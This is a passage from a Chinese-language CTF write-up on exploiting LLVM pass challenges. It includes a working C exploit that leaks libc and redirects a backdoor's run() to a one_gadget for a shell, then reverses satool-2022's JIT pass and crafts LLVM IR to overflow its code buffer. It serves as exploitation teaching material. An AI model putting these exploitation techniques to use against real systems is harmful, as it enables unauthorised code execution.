id=\"分析处理逻辑-2\"><a class=\"markdownIt-Anchor\" href=\"#分析处理逻辑-2\">#</a> 分析处理逻辑</h3>\n<p>比起 yakagame 根本不能看，yakagame 至少还能勉强看明白，这个程序完全就是一坨，在里面摸了几个字符串如下</p>\n<blockquote>\n<p>B4ckDo0r</p>\n<p>save</p>\n<p>takeaway</p>\n<p>stealkey</p>\n<p>fakekey</p>\n<p>run</p>\n</blockquote>\n<p>这个 run 一看就很可疑好吧（…，不过现在连函数有几个参数都不清楚，并且运行还没回显，连程序跑到哪里都不知道，再加上检查和处理逻辑全放一堆，导致静态非常地难看</p>\n<h3 id=\"调试与分析-2\"><a class=\"markdownIt-Anchor\" href=\"#调试与分析-2\">#</a> 调试与分析</h3>\n<p>opt 程序是一样的，第一个断点也可以一样</p>\n<h4 id=\"save\"><a class=\"markdownIt-Anchor\" href=\"#save\">#</a> save</h4>\n<p>先尝试一下一个参数的   <code>save(&quot;deadbeef&quot;);</code> ，然后断在 <code>malloc</code>  下面，为什么选字符串呢，因为我看到了个 memcpy ^^</p>\n<blockquote>\n<p>断点一 ：0x4b8e0e</p>\n<p>断点二 ：0x1CC2 + 0x7ffff23a0000</p>\n</blockquote>\n<pre class=\"language-nsis\" data-language=\"nsis\"><code class=\"language-nsis\"><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span><span class=\"token number\">0000000000001</span>CB8                 mov     edi<span class=\"token punctuation\">,</span> <span class=\"token number\">18</span>h        <span class=\"token comment\">; size</span>\n<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span><span class=\"token number\">0000000000001</span>CBD                 call    _malloc\n<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span><span class=\"token number\">0000000000001</span>CC2                 mov     rbx<span class=\"token punctuation\">,</span> rax</code></pre>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815110744695.png\" alt=\"image-20220815110744695\"></p>\n<p>直接寄了</p>\n<p>接下来有理由怀疑是两个字符串  <code>save(&quot;deadbeef&quot; ,&quot;test&quot;);</code> ，因为 memcpy 出现了两次 ^^，果然过了</p>\n<h4 id=\"takeaway\"><a class=\"markdownIt-Anchor\" href=\"#takeaway\">#</a> takeaway</h4>\n<p>下面就一个 free，有理由怀疑没有参数，直接试一下捏，我猜程序里有很多地方调用 free，直接断 free 应该不行</p>\n<blockquote>\n<p>断点一 ：0x4b8e0e</p>\n<p>断点二 ：0x1F4F + 0x7ffff23a0000</p>\n</blockquote>\n<p>寄了</p>\n<p>感觉是 free 前面一大坨检查没有过，把断点改上一点</p>\n<blockquote>\n<p>断点二 ：0x1E1E + 0x7ffff23a0000</p>\n</blockquote>\n<p>还是不行，换一个字符串参数试试  <code>takeaway(&quot;deadbeef&quot;);</code>  可以了捏，还真 free 掉了，估计 save 的第一个参数就是 key 第二个参数就是 data （之类的</p>\n<h4 id=\"stealkey\"><a class=\"markdownIt-Anchor\" href=\"#stealkey\">#</a> stealkey</h4>\n<p>这个模块这么短，一看就不需要参数吧（</p>\n<blockquote>\n<p>断点一 ：0x4b8e0e</p>\n<p>断点二 ：0x1FFA+ 0x7ffff23a0000</p>\n</blockquote>\n<p>果然</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815114811003.png\" alt=\"image-20220815114811003\"></p>\n<p>在这之后顺便看看全局变量，将里面的 key 以 8 字节解引用了一份出来</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815114931144.png\" alt=\"image-20220815114931144\"></p>\n<h4 id=\"fakekey\"><a class=\"markdownIt-Anchor\" href=\"#fakekey\">#</a> fakekey</h4>\n<p>这个函数我是眼熟的 <code>llvm::APInt::getSExtValue</code>  参数是 Int 嘛</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815115729411.png\" alt=\"image-20220815115729411\"></p>\n<blockquote>\n<p>断点一 ：0x4b8e0e</p>\n<p>断点二 ：0x2121+ 0x7ffff23a0000</p>\n</blockquote>\n<p>看得出来这里就是把 key 加上了一个偏移再复制回去</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815120801309.png\" alt=\"image-20220815120801309\"></p>\n<p>执行这段前</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815120919584.png\" alt=\"image-20220815120919584\"></p>\n<p>执行这段后，果然已经加上了这个偏移</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815120957014.png\" alt=\"image-20220815120957014\"></p>\n<h4 id=\"run\"><a class=\"markdownIt-Anchor\" href=\"#run\">#</a> run</h4>\n<p>最后就是逆大天的函数，run，这里貌似直接把 key 当成函数调用了</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815121641481.png\" alt=\"image-20220815121641481\"></p>\n<p>只能说出题人是懂 ctf 的</p>\n<blockquote>\n<p>断点一 ：0x4b8e0e</p>\n<p>断点二 ：0x21BC+ 0x7ffff23a0000</p>\n</blockquote>\n<p>到这里直接 call，太棒了</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815122828165.png\" alt=\"image-20220815122828165\"></p>\n<p>那么我们只需要把这里改成 gadget 就行了，考虑到此时栈上一大堆地方是 0，甚至可以直接用 <code>onegadget</code> ，但是改成 <code>onegadget</code>  的话应当需要知道 libc 的基地址</p>\n<h3 id=\"攻击-2\"><a class=\"markdownIt-Anchor\" href=\"#攻击-2\">#</a> 攻击</h3>\n<p>再回头看看，可以看到程序通过堆来申请内存，之后通过 memcpy 来复制内容，这个 memcpy 的第三个参数不知道从哪里来的，有可能是获取参数时顺带获得的</p>\n<p>首先我们看一下申请前的堆布局，这个时候申请 0x18 的块肯定会拿掉 fastbin 里的堆块，这样我们拿不到 libc 地址</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815123928234.png\" alt=\"image-20220815123928234\"></p>\n<p>那么我们直接申请两次，第二次 key 只给一个字符，下面的堆布局申请 0x18 肯定就会拿 libc 的地址了</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815124419606.png\" alt=\"image-20220815124419606\"></p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815124452243.png\" alt=\"image-20220815124452243\"></p>\n<p>执行后看看下面的 memcpy，可以看到只 cp 了俩字符，因此是可以拿到 libc 的</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815124618627.png\" alt=\"image-20220815124618627\"></p>\n<p>直接  <code>save(&quot;&quot; , &quot;test&quot;);</code>  试了下也可以</p>\n<p>这样我们可以使用如下脚本</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a <span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">takeaway</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">stealkey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fakekey</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">B4ckDo0r</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"deadbeef\"</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">stealkey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">// fakekey(0x111);</span>\n\n\t<span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n</code></pre>\n<p>之后断在 stealkey 查看全局变量的内存，可以看到已经有 libc 地址了</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815125731379.png\" alt=\"image-20220815125731379\"></p>\n<p>接下来找个 ogg ，因为大部分肯定是满足的，我们随便找一个就行（经尝试第一个不行</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815125923440.png\" alt=\"image-20220815125923440\"></p>\n<blockquote>\n<p>ogg_offset：0x4f432</p>\n<p>offset = - 0x39c87e</p>\n</blockquote>\n<p>最后的脚本</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a <span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">takeaway</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">stealkey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fakekey</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">B4ckDo0r</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"deadbeef\"</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">stealkey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fakekey</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span> <span class=\"token number\">0x39c87e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n</code></pre>\n<p>成功调用 ogg</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815131244841.png\" alt=\"image-20220815131244841\"></p>\n<p>成功 getshell</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815131307256.png\" alt=\"image-20220815131307256\"></p>\n<h2 id=\"satool-2022\"><a class=\"markdownIt-Anchor\" href=\"#satool-2022\">#</a> satool-2022</h2>\n<p>接下来这题更是重量级，但是比起上次国赛那题，已经工整很多了</p>\n<p><code>ubuntu22</code>  下安装 <code>llvm-12</code></p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">sudo apt install llvm-12</code></pre>\n<h3 id=\"分析处理逻辑-3\"><a class=\"markdownIt-Anchor\" href=\"#分析处理逻辑-3\">#</a> 分析处理逻辑</h3>\n<p>进入  <code>MBAPass::handle</code>  函数进行分析</p>\n<pre class=\"language-c++\" data-language=\"c++\"><code class=\"language-c++\">char *__fastcall &#96;anonymous namespace&#39;::MBAPass::handle(context *this, llvm::Function *a2)\n&#123;\n\t&#x2F;&#x2F;&#x2F; &#x2F;&#x2F;&#x2F;\n  stop_addr &#x3D; this-&gt;code + 0xFF0;\n  v29 &#x3D; (llvm::BasicBlock *)llvm::Function::front(a2);\n  Terminator &#x3D; (llvm::User *)llvm::BasicBlock::getTerminator(v29);\n  Operand &#x3D; llvm::User::getOperand(Terminator, 0);\n  if ( (llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;Operand) &amp; 1) !&#x3D; 0 )\n  &#123;\n    this-&gt;number &#x3D; 0;\n    v2 &#x3D; (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(Operand);\n    number &#x3D; llvm::ConstantInt::getSExtValue(v2);\n    &#96;anonymous namespace&#39;::MBAPass::writeMovImm64(this, 0, number);\n    return &#96;anonymous namespace&#39;::MBAPass::writeRet(this);\n  &#125;\n  else if ( (llvm::isa&lt;llvm::Argument,llvm::Value *&gt;(&amp;Operand) &amp; 1) !&#x3D; 0 )\n  &#123;\n    this-&gt;number &#x3D; 1;\n    &#96;anonymous namespace&#39;::MBAPass::writeMovImm64(this, 0, 0LL);\n    return &#96;anonymous namespace&#39;::MBAPass::writeRet(this);\n  &#125;\n  else\n  &#123;\n    &#96;anonymous namespace&#39;::MBAPass::writeMovImm64(this, 0, 0LL);\n    this-&gt;number &#x3D; 0;\n    std::stack&lt;llvm::Value *&gt;::stack&lt;std::deque&lt;llvm::Value *&gt;,void&gt;(op_stack);\n    std::stack&lt;int&gt;::stack&lt;std::deque&lt;int&gt;,void&gt;(num_stack);\n    std::stack&lt;llvm::Value *&gt;::push(op_stack, &amp;Operand);\n    v24 &#x3D; 1;\n    std::stack&lt;int&gt;::push(num_stack, &amp;v24);\n    while ( this-&gt;pointer &lt; stop_addr )\n    &#123;\n      if ( !std::stack&lt;llvm::Value *&gt;::size(op_stack) )\n      &#123;\n        &#96;anonymous namespace&#39;::MBAPass::writeRet(this);\n        break;\n      &#125;\n      op &#x3D; *(llvm **)std::stack&lt;llvm::Value *&gt;::top(op_stack);\n      std::stack&lt;llvm::Value *&gt;::pop(op_stack);\n      num &#x3D; *(_DWORD *)std::stack&lt;int&gt;::top(num_stack);\n      std::stack&lt;int&gt;::pop(num_stack);\n      v5 &#x3D; op;\n      opcode &#x3D; (llvm *)llvm::dyn_cast&lt;llvm::BinaryOperator,llvm::Value&gt;(op);\n      if ( !opcode )\n      &#123;\n        v6 &#x3D; llvm::errs(v5);\n        v7 &#x3D; llvm::raw_ostream::operator&lt;&lt;(v6, &quot;Unsupported opcode: &quot;);\n        v8 &#x3D; llvm::operator&lt;&lt;(v7, op);\n        llvm::raw_ostream::operator&lt;&lt;(v8, &quot;\\n&quot;);\n        exit(-1);\n      &#125;\n      if ( (unsigned int)llvm::BinaryOperator::getOpcode(opcode) !&#x3D; 13 )&#x2F;&#x2F; add\n      &#123;\n        v9 &#x3D; opcode;\n        if ( (unsigned int)llvm::BinaryOperator::getOpcode(opcode) !&#x3D; 15 )&#x2F;&#x2F; dec\n        &#123;\n          v10 &#x3D; llvm::errs(v9);\n          v15 &#x3D; llvm::raw_ostream::operator&lt;&lt;(v10, &quot;Unsupported opcode: &quot;);\n          OpcodeName &#x3D; llvm::Instruction::getOpcodeName(opcode);\n          v12 &#x3D; llvm::raw_ostream::operator&lt;&lt;(v15, OpcodeName);\n          llvm::raw_ostream::operator&lt;&lt;(v12, &quot;\\n&quot;);\n          exit(-1);\n        &#125;\n      &#125;\n      tmp_1 &#x3D; llvm::BinaryOperator::getOperand(opcode, 0);&#x2F;&#x2F; add\n      tmp_2 &#x3D; llvm::BinaryOperator::getOperand(opcode, 1u);\n      if ( (llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;tmp_1) &amp; 1) !&#x3D; 0 )\n      &#123;\n        v13 &#x3D; (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(tmp_1);\n        sign &#x3D; llvm::ConstantInt::getSExtValue(v13);\n        if ( sign &#x3D;&#x3D; 1 || sign &#x3D;&#x3D; -1 )\n        &#123;\n          &#96;anonymous namespace&#39;::MBAPass::writeInc(this, sign * num);\n        &#125;\n        else\n        &#123;\n          &#96;anonymous namespace&#39;::MBAPass::writeMovImm64(this, 1, sign * num);\n          &#96;anonymous namespace&#39;::MBAPass::writeOpReg(this, 1);\n        &#125;\n      &#125;\n      else if ( (llvm::isa&lt;llvm::Argument,llvm::Value *&gt;(&amp;tmp_1) &amp; 1) !&#x3D; 0 )\n      &#123;\n        this-&gt;number +&#x3D; num;\n      &#125;\n      else\n      &#123;\n        std::stack&lt;llvm::Value *&gt;::push(op_stack, &amp;tmp_1);\n        std::stack&lt;int&gt;::push();\n      &#125;\n      if ( (unsigned int)llvm::BinaryOperator::getOpcode(opcode) &#x3D;&#x3D; 15 )&#x2F;&#x2F; dec\n        num &#x3D; -num;\n      if ( (llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;tmp_2) &amp; 1) !&#x3D; 0 )\n      &#123;\n        v14 &#x3D; (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(tmp_2);\n        sign1 &#x3D; llvm::ConstantInt::getSExtValue(v14);\n        if ( sign1 &#x3D;&#x3D; 1 || sign1 &#x3D;&#x3D; -1 )\n        &#123;\n          &#96;anonymous namespace&#39;::MBAPass::writeInc(this, num);\n        &#125;\n        else\n        &#123;\n          &#96;anonymous namespace&#39;::MBAPass::writeMovImm64(this, 1, sign1 * num);\n          &#96;anonymous namespace&#39;::MBAPass::writeOpReg(this, 1);\n        &#125;\n      &#125;\n      else if ( (llvm::isa&lt;llvm::Argument,llvm::Value *&gt;(&amp;tmp_2) &amp; 1) !&#x3D; 0 )\n      &#123;\n        this-&gt;number +&#x3D; num;\n      &#125;\n      else\n      &#123;\n        std::stack&lt;llvm::Value *&gt;::push(op_stack, &amp;tmp_2);\n        std::stack&lt;int&gt;::push();\n      &#125;\n    &#125;\n    std::stack&lt;int&gt;::~stack();\n    return (char *)std::stack&lt;llvm::Value *&gt;::~stack(op_stack);\n  &#125;\n&#125;</code></pre>\n<p>本来我还挺喜欢把 ida 反编译出来的屎来修复修复的，但是看着这坨 c 嘉嘉硬是提不起兴趣，这里其实就是通过栈来优化我们写的加减法代码，之后写进一块内存中，然后就开始执行这块地方，最后输出一坨优化后的代码</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815162920191.png\" alt=\"image-20220815162920191\"></p>\n<p>然后，其实程序中有一个很迷的操作，程序貌似将 code 字段复制了一份当成 pointer 指针，之后将将 code 字段 0xff0 偏移处当成了一个终止地址，每通过循环添加代码指针就增加，当指针增加到  <code>code + 0xff0</code>  处就停止</p>\n<p>但是，实际上这里经不起推敲，下面代码有个很经典的溢出错误</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220815171950164.png\" alt=\"image-20220815171950164\"></p>\n<p>当我们刚好满足条件后，再执行就会有溢出，之后就会在  <code>code + 0xff0</code>  外残留一段代码，那么第二次的 code 如果够长，刚好溢出并且没有将 ret 写进去</p>\n<p>这时候如果这段代码里可以解析成跳转类指令，而在这之前有如这样的指令</p>\n<blockquote>\n<p>add rax , xxxxxxxx</p>\n</blockquote>\n<p>万一能刚好跳到立即数 xxxxxxxx 中，而这 xxxxxxxx 又刚好能作为  <code>shellcode</code>  解析，之后通过 <code> jmp $+x</code>  来进行跳转到另一个立即数里，就可以执行 <code>shellcode</code>  了捏</p>\n<h3 id=\"调试与分析-3\"><a class=\"markdownIt-Anchor\" href=\"#调试与分析-3\">#</a> 调试与分析</h3>\n<p>首先这题和前面两题不一样，没有踏马的函数名给你解析，只有自己照着给的 demo 去做</p>\n<pre class=\"language-nsis\" data-language=\"nsis\"><code class=\"language-nsis\">define dso_local i64 @test1<span class=\"token punctuation\">(</span>i64 <span class=\"token operator\">%</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> local_unnamed_addr <span class=\"token comment\">#0 &#123;</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">2</span> <span class=\"token operator\">=</span> sub nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">3</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">68</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">4</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">5</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">204</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">6</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span><span class=\"token number\">3</span>\n  ret i64 <span class=\"token operator\">%</span><span class=\"token number\">6</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>可以先跑一下这个 demo</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816092513020.png\" alt=\"image-20220816092513020\"></p>\n<p>跟预期结果一样，再试一下下面跑两次的</p>\n<pre class=\"language-nsis\" data-language=\"nsis\"><code class=\"language-nsis\">define dso_local i64 @test1<span class=\"token punctuation\">(</span>i64 <span class=\"token operator\">%</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> local_unnamed_addr <span class=\"token comment\">#0 &#123;</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">2</span> <span class=\"token operator\">=</span> sub nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">3</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">68</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">4</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">5</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">204</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">6</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span><span class=\"token number\">3</span>\n  ret i64 <span class=\"token operator\">%</span><span class=\"token number\">6</span>\n<span class=\"token punctuation\">&#125;</span>\n\ndefine dso_local i64 @test2<span class=\"token punctuation\">(</span>i64 <span class=\"token operator\">%</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> local_unnamed_addr <span class=\"token comment\">#0 &#123;</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">2</span> <span class=\"token operator\">=</span> sub nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">3</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11111</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">4</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2222</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">5</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">111111111</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">6</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span><span class=\"token number\">3</span>\n  ret i64 <span class=\"token operator\">%</span><span class=\"token number\">6</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>也是 ok 的</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816092856368.png\" alt=\"image-20220816092856368\"></p>\n<p>其实这题在我看来最关键的漏洞并不是那个溢出，而是没有初始化，其实无论是否溢出，如果没有最后的 ret 指令，那么 code 段还是会一直执行的，这样就可能执行到立即数解析出来的代码</p>\n<blockquote>\n<p>这里如果立即数为 1 就会变成 INC 指令，结合不同于它长度的指令可以错位</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816135450883.png\" alt=\"image-20220816135450883\"></p>\n<p>这条命令占 3 字节，另一条占 13 字节</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816135621731.png\" alt=\"image-20220816135621731\"></p>\n</blockquote>\n<p>接下来尝试使用如下 exp，调试一下</p>\n<pre class=\"language-nsis\" data-language=\"nsis\"><code class=\"language-nsis\">define dso_local i64 @test1<span class=\"token punctuation\">(</span>i64 <span class=\"token operator\">%</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> local_unnamed_addr <span class=\"token comment\">#0 &#123;</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">2</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">3</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43499</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">4</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43499</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">5</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43499</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">6</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43499</span>\n  ret i64 <span class=\"token operator\">%</span><span class=\"token number\">6</span>\n<span class=\"token punctuation\">&#125;</span>\n\ndefine dso_local i64 @test2<span class=\"token punctuation\">(</span>i64 <span class=\"token operator\">%</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> local_unnamed_addr <span class=\"token comment\">#0 &#123;</span>\n  <span class=\"token operator\">%</span><span class=\"token number\">2</span> <span class=\"token operator\">=</span> add nsw i64 <span class=\"token operator\">%</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n  ret i64 <span class=\"token operator\">%</span><span class=\"token number\">2</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>断点</p>\n<blockquote>\n<p>断点一：0x42fe64</p>\n<p>断点二：0xF750 + 0x7fffefdc7000</p>\n</blockquote>\n<p>可以看到第二次运行到这里执行的 shellcode 如下，可以看见 ret 下面还有一堆残留，只不过因为 ret 执行不到</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816101533371.png\" alt=\"image-20220816101533371\"></p>\n<p>接下来就构造溢出的字节</p>\n<blockquote>\n<p>总长度 0xff0</p>\n<p>我们总是想多溢出一些的，抛开前面的必写进去的两个字节，那么我们前面的长度最好凑成 0xfee ，最后一条指令的立即数刚好全部溢出去，调试发现前面会自动有一个 10 字节的命令</p>\n<p>3*4 + 13*312 = 0xfee - 10</p>\n<p>因此写 4 条 inc 312 条 add 就行</p>\n</blockquote>\n<p>成功溢出成 <code> 0x1122334455667788</code></p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816141657227.png\" alt=\"image-20220816141657227\"></p>\n<h3 id=\"攻击-3\"><a class=\"markdownIt-Anchor\" href=\"#攻击-3\">#</a> 